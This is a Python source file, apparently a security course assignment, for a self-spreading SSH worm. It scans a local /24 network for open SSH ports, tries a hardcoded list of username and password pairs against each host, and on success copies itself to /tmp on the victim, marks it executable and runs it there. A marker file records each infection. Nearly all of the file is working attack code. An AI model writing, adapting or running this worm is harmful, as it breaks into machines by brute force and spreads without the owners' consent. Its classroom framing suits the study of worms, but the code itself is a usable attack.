import os
import sys
import socket
import paramiko
import nmap
import netinfo
import netifaces
import socket
import fcntl
import struct
import shutil

# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('cpsc', 'password'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	try:
		f = open(INFECTED_MARKER_FILE)
		f.close()
		print("file found")
		return True
	except:
		print("File not found")
	return False

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	try:
		f = open(INFECTED_MARKER_FILE, "w")
		f.write("Infected by the notorious hacker known as 4chan!")
		f.close()
		print("File created successfully")
	except:
		print("File not created")
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/" + "worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("python /tmp/worm.py")
	


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	try:
		sshClient.connect(host, username = userName, password = password)
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.
	except socket.error:
			print(socket.error)
			return 3	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	except paramiko.SSHException:
		print(paramiko.SSHException)
		return 1
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		attemptResults = tryCredentials(host, username, password, ssh)
		if attemptResults == 0:
			return (ssh, username, password)
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	ipAddr = None
	addr = netifaces.ifaddresses(interface)[2][0]['addr']
	if not addr == "127.0.0.1":
		# Save the IP addrss and break
		ipAddr = addr
	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	portScanner = nmap.PortScanner()
	portScanner.scan('10.0.0.0/24', arguments = '-p 22 --open')
	return portScanner.all_hosts()

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 

if len(sys.argv) < 2:
	if os.path.exists( INFECTED_MARKER_FILE ):
		print("Already infected. Please delete infected.txt in tmp.")
		sys.exit()

	markInfected()
ip_addr = None
networkInterfaces = netifaces.interfaces()
for interface in networkInterfaces:
	# Get the IP of the current system
	if getMyIP(interface):
		ip_addr = getMyIP(interface)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()
networkHosts.remove(ip_addr)

#This copies the program into /tmp on the host machine
shutil.copy("worm.py", "/tmp/worm.py")

print("Found hosts: ", networkHosts)

# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	 
	print(sshInfo)
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print("Trying to spread")
		
		# Infect that system
		spreadAndExecute(sshInfo[0])
		
		print("Spreading complete")	
	

